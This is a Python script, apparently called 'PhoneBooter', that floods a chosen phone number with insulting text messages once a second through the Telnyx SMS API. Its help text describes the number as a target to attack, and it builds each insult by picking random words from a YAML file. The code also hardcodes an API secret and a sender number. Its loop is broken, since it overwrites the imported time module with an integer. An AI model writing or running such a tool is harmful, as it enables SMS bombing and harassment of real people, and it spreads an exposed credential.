import requests
import time
import random
import os
import yaml
import json
import argparse


class SMSMessenger():


    def telnyx_sms(self, number, message):

        SMS_SECRET = 'iIcV3RffGUZJmKFvwObZJ577'

        config = yaml.load(open(os.path.dirname(__file__) + './libs/insults.yml'))

        pref = 'You are a'
        # algorithm simply makes a random choice from three different columns and concatenates them.
        col1 = random.choice(config['column1'])
        col2 = random.choice(config['column2'])
        col3 = random.choice(config['column3'])
        message = (pref + ' ' + col1 + ' ' + col2 + ' ' + col3 + '.')

        url = 'https://sms.telnyx.com/messages'
        headers = {
          'Content-Type': 'application/json',
          'Accept': 'application/json',
          'x-profile-secret': SMS_SECRET
        }

        payload = r"""{"from":"+14692839935","to":"+%s","body":"%s"}""" % (number, message)
        response = requests.request('POST', url, headers=headers, data=payload)

        print(response.text)


if __name__ == "__main__":
    banner = """

                                                                                                                      
                                                                                                                      
  /$$$$$$$ /$$$$$$/$$$$   /$$$$$$$        /$$$$$$$  /$$$$$$   /$$$$$$  /$$$$$$/$$$$  /$$$$$$/$$$$   /$$$$$$   /$$$$$$ 
 /$$_____/| $$_  $$_  $$ /$$_____/       /$$_____/ /$$__  $$ |____  $$| $$_  $$_  $$| $$_  $$_  $$ /$$__  $$ /$$__  $$
|  $$$$$$ | $$ \ $$ \ $$|  $$$$$$       |  $$$$$$ | $$  \ $$  /$$$$$$$| $$ \ $$ \ $$| $$ \ $$ \ $$| $$$$$$$$| $$  \__/
 \____  $$| $$ | $$ | $$ \____  $$       \____  $$| $$  | $$ /$$__  $$| $$ | $$ | $$| $$ | $$ | $$| $$_____/| $$      
 /$$$$$$$/| $$ | $$ | $$ /$$$$$$$/       /$$$$$$$/| $$$$$$$/|  $$$$$$$| $$ | $$ | $$| $$ | $$ | $$|  $$$$$$$| $$      
|_______/ |__/ |__/ |__/|_______//$$$$$$|_______/ | $$____/  \_______/|__/ |__/ |__/|__/ |__/ |__/ \_______/|__/      
                                |______/          | $$                                                                
                                                  | $$                                                                
                                                  |__/                                                                
       NOTE: Rate limited to 1 per second.
       ex. usage: sms.py -p <number> -l 30
       """
    print(banner)
    parser = argparse.ArgumentParser(description='PhoneBooter CLI')
    parser.add_argument('-p', '--phonenumber', action='store', dest='targetNum', required=True,
                        help='Specify the target phone number to attack. Example: 18001234567')
    parser.add_argument('-l', '--length', action='store', dest='bootLength', required=True,
                        help='Length of time in seconds to send SMS messages to the phone.')
    args = parser.parse_args()
    sms = SMSMessenger()
    time = int(args.bootLength)
    i = 0
    while i <= time:

        sms.telnyx_sms(args.targetNum, '')
        time.sleep(1)
        i += 1
